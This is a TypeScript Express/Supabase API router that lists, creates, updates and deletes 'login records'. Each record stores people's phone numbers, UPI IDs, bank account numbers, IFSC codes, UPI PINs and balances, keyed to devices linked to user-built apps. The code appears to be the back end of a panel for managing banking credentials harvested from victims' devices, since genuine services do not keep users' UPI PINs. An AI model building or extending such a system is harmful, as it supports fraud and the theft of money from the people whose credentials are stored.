import { Router, Request, Response } from 'express';
import { createClient } from '@supabase/supabase-js';
import config from '../../config/env';
import { authenticate } from '../../middleware/auth';
import { asyncHandler } from '../../middleware/errorHandler';
import logger from '../../utils/logger';

const router = Router();
const supabase = createClient(config.supabase.url, config.supabase.serviceRoleKey);

/**
 * GET /api/v1/login-records
 * List login records
 */
router.get('/', authenticate, asyncHandler(async (req: Request, res: Response) => {
    const { databaseId, userId: queryUserId, status, appName, linkedDeviceId, appId, limit = 100, offset = 0 } = req.query;
    const userId = req.user!.id;
    const isAdmin = req.user!.role === 'admin';

    let query = supabase
        .from('login_records')
        .select('*')
        .order('created_at', { ascending: false })
        .range(Number(offset), Number(offset) + Number(limit) - 1);

    // If not admin, restrict to own records OR records for own devices
    if (!isAdmin) {
        // Find all devices owned by the user to allow filtering by linked_device_id
        const { data: userApps } = await supabase
            .from('app_builder_apps')
            .select('id')
            .eq('owner_id', req.user!.uuid);
        const ownedAppIds = (userApps || []).map(a => a.id);

        const { data: ownedDevices } = await supabase
            .from('devices')
            .select('device_id')
            .in('app_id', ownedAppIds);
        const ownedDeviceIds = (ownedDevices || []).map(d => d.device_id);

        // Apply filtering: (user_id = userId) OR (linked_device_id IN ownedDeviceIds)
        if (ownedDeviceIds.length > 0) {
            query = query.or(`user_id.eq.${userId},linked_device_id.in.(${ownedDeviceIds.join(',')})`);
        } else {
            query = query.eq('user_id', userId);
        }
    }

    if (databaseId) {
        query = query.eq('database_id', databaseId);
    }

    if (queryUserId) {
        let targetId: any = queryUserId;
        // If it's a UUID string instead of numeric ID, look up the numeric ID
        if (typeof queryUserId === 'string' && !/^\d+$/.test(queryUserId)) {
            const { data: profile } = await supabase
                .from('user_profiles')
                .select('id')
                .eq('supabase_user_id', queryUserId)
                .single();
            targetId = profile?.id || -1; // -1 to return nothing if not found
        }

        // If not admin and trying to view another user's records, it will be blocked by the .or() above,
        // but we can also explicitly check here for clarity.
        if (!isAdmin && targetId.toString() !== userId.toString()) {
            // Let it fall through, the .or() will still apply, but records will likely be 0.
        }
        query = query.eq('user_id', targetId);
    }

    if (status) {
        query = query.eq('status', status);
    }

    if (appName) {
        query = query.eq('app_name', appName);
    }

    if (linkedDeviceId) {
        query = query.eq('linked_device_id', linkedDeviceId);
    }

    if (appId) {
        // Find devices belonging to this app to filter login records by linked_device_id
        const { data: appDevices, error: devicesError } = await supabase
            .from('devices')
            .select('device_id')
            .eq('app_id', appId);

        if (devicesError) {
            logger.error(devicesError, `Error fetching devices for appId ${appId}:`);
            throw devicesError;
        }

        const deviceIds = (appDevices || []).map(d => d.device_id);
        if (deviceIds.length > 0) {
            query = query.in('linked_device_id', deviceIds);
        } else {
            return res.json({
                success: true,
                records: [],
                pagination: {
                    limit: Number(limit),
                    offset: Number(offset),
                    count: 0,
                },
            });
        }
    }


    const { data: records, error } = await query;

    if (error) throw error;

    return res.json({
        success: true,
        records: records.map(record => ({
            ...record,
            id: record.id.toString(),
            user_id: record.user_id?.toString(),
            database_id: record.database_id?.toString(),
        })),
        pagination: {
            limit: Number(limit),
            offset: Number(offset),
            count: records.length,
        },
    });
}));

/**
 * GET /api/v1/login-records/:id
 * Get single login record
 */
router.get('/:id', authenticate, asyncHandler(async (req: Request, res: Response) => {
    const { id } = req.params;
    const userId = req.user!.id;
    const isAdmin = req.user!.role === 'admin';

    const { data: record, error } = await supabase
        .from('login_records')
        .select('*')
        .eq('id', id)
        .maybeSingle();

    if (error) throw error;

    if (!record) {
        return res.status(404).json({
            success: false,
            error: 'Login record not found',
        });
    }

    // Verify ownership if not admin
    if (!isAdmin) {
        if (record.user_id?.toString() !== userId.toString()) {
            // Check if linked device is owned by user
            const { data: deviceAssignment } = await supabase
                .from('devices')
                .select('app_id')
                .eq('device_id', record.linked_device_id)
                .maybeSingle();

            let isDeviceOwned = false;
            if (deviceAssignment?.app_id) {
                const { data: appOwner } = await supabase
                    .from('app_builder_apps')
                    .select('owner_id')
                    .eq('id', deviceAssignment.app_id)
                    .single();
                if (appOwner?.owner_id === req.user!.uuid) {
                    isDeviceOwned = true;
                }
            }

            if (!isDeviceOwned) {
                return res.status(403).json({ success: false, error: 'Forbidden' });
            }
        }
    }

    return res.json({
        success: true,
        record: {
            ...record,
            id: record.id.toString(),
            user_id: record.user_id?.toString(),
            database_id: record.database_id?.toString(),
        },
    });
}));

/**
 * POST /api/v1/login-records
 * Create login record
 */
router.post('/', authenticate, asyncHandler(async (req: Request, res: Response) => {
    const {
        deviceName,
        deviceType,
        deviceModel,
        linkedDeviceId,
        profileName,
        phoneNumber,
        upiId,
        appName,
        loginType,
        bankName,
        accountNumber,
        ifscCode,
        upiPin,
        balance,
        status,
        notes,
        databaseId,
        userId: bodyUserId,
        personName,
    } = req.body;

    const userId = req.user!.id;
    const isAdmin = req.user!.role === 'admin';

    // If not admin, force user_id to current user
    const targetUserId = isAdmin ? (bodyUserId || userId) : userId;

    const { data: record, error } = await supabase
        .from('login_records')
        .insert({
            device_name: deviceName,
            device_type: deviceType,
            device_model: deviceModel,
            linked_device_id: linkedDeviceId,
            profile_name: profileName,
            phone_number: phoneNumber,
            upi_id: upiId,
            app_name: appName,
            login_type: loginType,
            bank_name: bankName,
            account_number: accountNumber,
            ifsc_code: ifscCode,
            upi_pin: upiPin,
            balance: balance ? parseFloat(balance) : 0,
            status: status || 'active',
            notes,
            database_id: databaseId || null,
            user_id: targetUserId,
            person_name: personName,
        })
        .select()
        .single();

    if (error) throw error;

    logger.info(`Login record created: ${record.id}`);

    return res.json({
        success: true,
        record: {
            ...record,
            id: record.id.toString(),
            user_id: record.user_id?.toString(),
            database_id: record.database_id?.toString(),
        },
    });
}));

/**
 * PUT /api/v1/login-records/:id
 * Update login record
 */
router.put('/:id', authenticate, asyncHandler(async (req: Request, res: Response) => {
    const { id } = req.params;
    const {
        deviceName,
        deviceType,
        deviceModel,
        linkedDeviceId,
        profileName,
        phoneNumber,
        upiId,
        appName,
        loginType,
        bankName,
        accountNumber,
        ifscCode,
        upiPin,
        balance,
        status,
        notes,
        databaseId,
        userId: bodyUserId,
        personName,
    } = req.body;

    const currentUserId = req.user!.id;
    const isAdmin = req.user!.role === 'admin';

    // Verify ownership if not admin
    if (!isAdmin) {
        const { data: existingRecord } = await supabase
            .from('login_records')
            .select('user_id')
            .eq('id', id)
            .single();
        if (!existingRecord || existingRecord.user_id?.toString() !== currentUserId.toString()) {
            return res.status(403).json({ success: false, error: 'Forbidden' });
        }
    }

    const updates: any = {};
    if (deviceName !== undefined) updates.device_name = deviceName;
    if (deviceType !== undefined) updates.device_type = deviceType;
    if (deviceModel !== undefined) updates.device_model = deviceModel;
    if (linkedDeviceId !== undefined) updates.linked_device_id = linkedDeviceId;
    if (profileName !== undefined) updates.profile_name = profileName;
    if (phoneNumber !== undefined) updates.phone_number = phoneNumber;
    if (upiId !== undefined) updates.upi_id = upiId;
    if (appName !== undefined) updates.app_name = appName;
    if (loginType !== undefined) updates.login_type = loginType;
    if (bankName !== undefined) updates.bank_name = bankName;
    if (accountNumber !== undefined) updates.account_number = accountNumber;
    if (ifscCode !== undefined) updates.ifsc_code = ifscCode;
    if (upiPin !== undefined) updates.upi_pin = upiPin;
    if (balance !== undefined) updates.balance = parseFloat(balance);
    if (status !== undefined) updates.status = status;
    if (notes !== undefined) updates.notes = notes;
    if (databaseId !== undefined) updates.database_id = databaseId;
    if (bodyUserId !== undefined) {
        let targetId: any = bodyUserId;
        if (bodyUserId && typeof bodyUserId === 'string' && !/^\d+$/.test(bodyUserId)) {
            const { data: profile } = await supabase
                .from('user_profiles')
                .select('id')
                .eq('supabase_user_id', bodyUserId)
                .single();
            targetId = profile?.id || null;
        }
        updates.user_id = targetId;
    }
    if (personName !== undefined) updates.person_name = personName;

    const { data: record, error } = await supabase
        .from('login_records')
        .update(updates)
        .eq('id', id)
        .select()
        .single();

    if (error) throw error;

    logger.info(`Login record updated: ${id}`);

    return res.json({
        success: true,
        record: {
            ...record,
            id: record.id.toString(),
            user_id: record.user_id?.toString(),
            database_id: record.database_id?.toString(),
        },
    });
}));

/**
 * DELETE /api/v1/login-records/bulk
 * Bulk delete login records
 */
router.delete('/bulk', authenticate, asyncHandler(async (req: Request, res: Response) => {
    const { ids } = req.body;
    const userId = req.user!.id;
    const isAdmin = req.user!.role === 'admin';

    if (!Array.isArray(ids) || ids.length === 0) {
        return res.status(400).json({
            success: false,
            error: 'ids array is required',
        });
    }

    let query = supabase
        .from('login_records')
        .delete()
        .in('id', ids);

    if (!isAdmin) {
        query = query.eq('user_id', userId);
    }

    const { error, count } = await query;

    if (error) throw error;

    logger.info(`Bulk deleted ${count || 0} login records`);

    return res.json({
        success: true,
        message: `Deleted ${count || 0} login records`,
        deletedCount: count || 0,
    });
}));

/**
 * DELETE /api/v1/login-records/:id
 * Delete login record
 */
router.delete('/:id', authenticate, asyncHandler(async (req: Request, res: Response) => {
    const { id } = req.params;
    const userId = req.user!.id;
    const isAdmin = req.user!.role === 'admin';

    let query = supabase
        .from('login_records')
        .delete()
        .eq('id', id);

    if (!isAdmin) {
        query = query.eq('user_id', userId);
    }

    const { error } = await query;

    if (error) throw error;

    logger.info(`Login record deleted: ${id}`);

    return res.json({
        success: true,
        message: 'Login record deleted successfully',
    });
}));

export default router;
